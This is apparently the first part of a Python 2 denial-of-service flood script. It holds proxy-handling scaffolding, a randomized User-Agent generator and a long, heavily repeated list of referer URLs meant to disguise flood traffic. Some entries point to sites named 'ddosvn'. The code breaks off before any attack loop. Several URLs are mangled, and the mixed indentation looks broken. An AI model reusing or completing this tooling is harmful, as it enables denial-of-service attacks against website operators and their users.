# -*- coding: utf-8 -*-
#!/usr/bin/env python2
#Coded By P3terJ4mes 
import os
import re
import sys
import time
import base64
import struct
import random
import socket
import urllib
import urllib2
import requests
import datetime
import threading
from threading import Lock
from threading import Thread
from random import randrange
from handlers import HTTPHandler

Close = False
PROXY_TYPE_SOCKS4 = 1
PROXY_TYPE_SOCKS5 = 2
PROXY_TYPE_HTTP = 3

_defaultproxy = None
_orgsocket = socket.socket

class ProxyError(Exception): pass
class GeneralProxyError(ProxyError): pass
class Socks5AuthError(ProxyError): pass
class Socks5Error(ProxyError): pass
class Socks4Error(ProxyError): pass
class HTTPError(ProxyError): pass

_generalerrors = ("success",
    "invalid data",
    "not connected",
    "not available",
    "bad proxy type",
    "bad input")

_socks5errors = ("succeeded",
    "general SOCKS server failure",
    "connection not allowed by ruleset",
    "Network unreachable",
    "Host unreachable",
    "Connection refused",
    "TTL expired",
    "Command not supported",
    "Address type not supported",
    "Unknown error")

_socks5autherrors = ("succeeded",
    "authentication is required",
    "all offered authentication methods were rejected",
    "unknown username or invalid password",
    "unknown error")

_socks4errors = ("request granted",
    "request rejected or failed",
    "request rejected because SOCKS server cannot connect to identd on the client",
    "request rejected because the client program and identd report different user-ids",
    "unknown error")
size = '65000'
headers_referers=[]
request_counter=0
flag=0
safe=0
def inc_counter():
	global request_counter
	request_counter+=1

def set_flag(val):
	global flag
	flag=val

def set_safe():
	global safe
	safe=1
	
def getUserAgent():
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os  = random.choice(['68K', 'PPC'])
    elif platform == 'Windows':
        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE', 'Windows 7', 'Windows 8'])
    elif platform == 'X11':
        os  = random.choice(['Linux i686', 'Linux x86_64'])
    browser = random.choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(random.randint(2000, currentYear))
        month = random.randint(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = random.randint(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(random.randint(1, 21)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(random.randint(1, 10)) + '.0'
        engine = str(random.randint(1, 5)) + '.0'
        option = random.choice([True, False])
        if option == True:
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
def referer_list():
        global headers_referers
        headers_referers.append('https://domainr.com/?q=')
        headers_referers.append('https://down.is/')
        headers_referers.append('http://whois.domaintools.com/')
        headers_referers.append('https://downforeveryoneorjustme.com/')
        headers_referers.append('https://www.webhostinghero.com/#')
        headers_referers.append('https://www.whoishostingthis.com/#search=')
        headers_referers.append('https://ping.eu/port-chk/?url=')
        headers_referers.append('https://www.host-tracker.com/?url=')
        headers_referers.append('http://hostchecker.net/?url=')
        headers_referers.append('https://hostingchecker.com/?url=')
        headers_referers.append('https://www.virustotal.com/vi/?url=')
        headers_referers.append('http://tainhachay.mobi/?url=')
        headers_referers.append('http://trangtainhac.info/?url=')
        headers_referers.append('http://www.phimmoi.net/?url=')
        headers_referers.append('https://website.informer.com/')
        headers_referers.append('https://tainhacvemay.net/?url=')
        headers_referers.append('https://nhacvietnam.mobi/?url=')
        headers_referers.append('https://waptainhac.net/?url=')
        headers_referers.append('https://trangtainhac.net/?url=')
        headers_referers.append('https://trangtainhac.com/?url=')
        headers_referers.append('https://yamcode.com/?url=')
        headers_referers.append('http://waptaiaz.com/tai-nhac-mp3/web/artist/list/quality=1&ver=w/?url=')
        headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
        headers_referers.append('http://vk.com/profile.php?redirect=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
        headers_referers.append('http://yandex.ru/yandsearch?text=')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
        headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
        headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
        headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
        headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
        headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
        headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
        headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
        headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
        headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://www.yandex.com/yandsearch?text=')
        headers_referers.append('https://duckduckgo.com/?q=')
        headers_referers.append('http://www.ask.com/web?q=')
        headers_referers.append('http://search.aol.com/aol/search?q=')
        headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('http://ytmnd.com/search?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('http://ytmnd.com/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('http://ytmnd.com/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('http://ytmnd.com/search?q=')
        headers_referers.append('http://coccoc.com/search#query=')
        headers_referers.append('http://www.search.com/search?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
        headers_referers.append('http://vk.com/profile.php?redirect=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
        headers_referers.append('http://yandex.ru/yandsearch?text=')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
        headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
        headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
        headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
        headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
        headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
        headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
        headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
        headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
        headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://www.yandex.com/yandsearch?text=')
        headers_referers.append('https://duckduckgo.com/?q=')
        headers_referers.append('http://www.ask.com/web?q=')
        headers_referers.append('http://search.aol.com/aol/search?q=')
        headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
        headers_referers.append('https://www.facebook.com/search/results/?init=quick&q=')
        headers_referers.append('http://blekko.com/#ws/?q=')
        headers_referers.append('http://www.infomine.com/search/?q=')
        headers_referers.append('https://twitter.com/search?q=')
        headers_referers.append('http://www.wolframalpha.com/input/?i=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('http://anonymouse.org/cgi-bin/anon-www.cgi/')
        headers_referers.append('http://www.onlinewebcheck.com/?url=')
        headers_referers.append('http://feedvalidator.org/check.cgi?url=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL')
        headers_referers.append('http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://www.pagescoring.com/website-speed-test/?url=')
        headers_referers.append('http://check-host.net/check-http?host=')
        headers_referers.append('http://checksite.us/?url=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://www.yandex.com/yandsearch?text=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://coccoc.com/search#query=')
        headers_referers.append('https://w...content-available-to-author-only...m.vn/?gws_rd=ssl#q=')
        headers_referers.append('http://y...content-available-to-author-only...x.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
        headers_referers.append('http://content-available-to-author-only.com/profile.php?redirect=')
        headers_referers.append('http://w...content-available-to-author-only...y.com/search/results?q=')
        headers_referers.append('http://y...content-available-to-author-only...x.ru/yandsearch?text=')
        headers_referers.append('http://g...content-available-to-author-only...l.ru/search?mail.ru=1&q=')
        headers_referers.append('http://n...content-available-to-author-only...r.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
        headers_referers.append('http://r...content-available-to-author-only...a.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
        headers_referers.append('http://r...content-available-to-author-only...o.com/search;_yzt=?=A7x9Q.bs67zf..')
        headers_referers.append('http://r...content-available-to-author-only...o.com/search;?_query?=l%t=?=?A7x..')
        headers_referers.append('http://g...content-available-to-author-only...l.ru/search?gay.ru.query=1&q=?abc.r..')
        headers_referers.append('http://n...content-available-to-author-only...r.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
        headers_referers.append('http://w...content-available-to-author-only...e.ru/url?sa=t&rct=?j&q=&e..')
        headers_referers.append('http://h...content-available-to-author-only...u.com/searchResult?keywords=')
        headers_referers.append('http://w...content-available-to-author-only...g.com/search?q=')
        headers_referers.append('https://w...content-available-to-author-only...x.com/yandsearch?text=')
        headers_referers.append('https://d...content-available-to-author-only...o.com/?q=')
        headers_referers.append('http://w...content-available-to-author-only...k.com/web?q=')
        headers_referers.append('http://s...content-available-to-author-only...l.com/aol/search?q=')
        headers_referers.append('https://w...content-available-to-author-only...m.nl/vaste-onderdelen/zoeken/?zoeken_term=')
        headers_referers.append('http://v...content-available-to-author-only...3.org/feed/check.cgi?url=')
        headers_referers.append('http://h...content-available-to-author-only...r.com/check_page/?furl=')
        headers_referers.append('http://w...content-available-to-author-only...r.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://j...content-available-to-author-only...3.org/css-validator/validator?uri=')
        headers_referers.append('https://a...content-available-to-author-only...o.com/rss?url=')
        headers_referers.append('http://e...content-available-to-author-only...l.com/search?q=')
        headers_referers.append('https://s...content-available-to-author-only...y.com/market/search?q=')
        headers_referers.append('http://f...content-available-to-author-only...o.com/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...t.com/site/pinterest.com/search?q=')
        headers_referers.append('http://e...content-available-to-author-only...e.net/wow/en/search?q=')
        headers_referers.append('http://e...content-available-to-author-only...l.com/search?q=')
        headers_referers.append('http://c...content-available-to-author-only...n.org/search?q=')
        headers_referers.append('http://t...content-available-to-author-only...t.edu/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...m.tv/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...d.com/search?q=')
        headers_referers.append('http://f...content-available-to-author-only...a.com/search?q=')
        headers_referers.append('http://i...content-available-to-author-only...h.io/search?q=')
        headers_referers.append('http://j...content-available-to-author-only...s.com/jobs/search?q=')
        headers_referers.append('http://t...content-available-to-author-only...p.org/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...m.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...s.gov/@@tceq-search?q=')
        headers_referers.append('http://w...content-available-to-author-only...t.com/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...r.com/events/search?q=')
        headers_referers.append('https://c...content-available-to-author-only...e.org/search?q=')
        headers_referers.append('http://j...content-available-to-author-only...s.com/search?q=')
        headers_referers.append('http://j...content-available-to-author-only...g.com/search?q=')
        headers_referers.append('https://w...content-available-to-author-only...t.com/search/?q=')
        headers_referers.append('http://m...content-available-to-author-only...r.org/search?q=')
        headers_referers.append('https://w...content-available-to-author-only...s.com/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...s.uk/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...q.com/search?q=')
        headers_referers.append('http://www.search.com/search?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url=')
        headers_referers.append('https://www.facebook.com/l.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('http://downforeveryoneorjustme.com/')
        headers_referers.append('http://www.slickvpn.com/go-dark/browse.php?u=')
        headers_referers.append('https://www.megaproxy.com/go/_mp_framed?')
        headers_referers.append('http://scanurl.net/?u=')
        headers_referers.append('http://www.isup.me/')
        headers_referers.append('http://check-host.net/check-tcp?host=')
        headers_referers.append('http://check-host.net/check-dns?host=')
        headers_referers.append('http://check-host.net/check-ping?host=')
        headers_referers.append('http://www.currentlydown.com/')
        headers_referers.append('http://check-host.net/ip-info?host=')
        headers_referers.append('https://safeweb.norton.com/report/show?url=')
        headers_referers.append('http://www.webproxy.net/view?q=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('https://anonysurfer.com/a2/index.php?q=')
        headers_referers.append('http://analiz.web.tr/en/www/')
        headers_referers.append('https://plus.google.com/share?url=')
        headers_referers.append('http://anonymouse.org/cgi-bin/anon-www.cgi/')
	headers_referers.append('http://ddosvn.somee.com/f5.php?v=')
	headers_referers.append('http://louis-ddosvn.rhcloud.com/f5.html?v=')
        headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
	headers_referers.append('https://graph.facebook.com/fql?q=SELECT%20like_count,%20total_count,%20share_count,%20click_count,%20comment_count%20FROM%20link_stat%20WHERE%20url%20=%20%22')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
	headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
	headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
	headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
	headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
	headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
	headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
	headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
	headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
        headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
	headers_referers.append('http://vk.com/profile.php?redirect=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
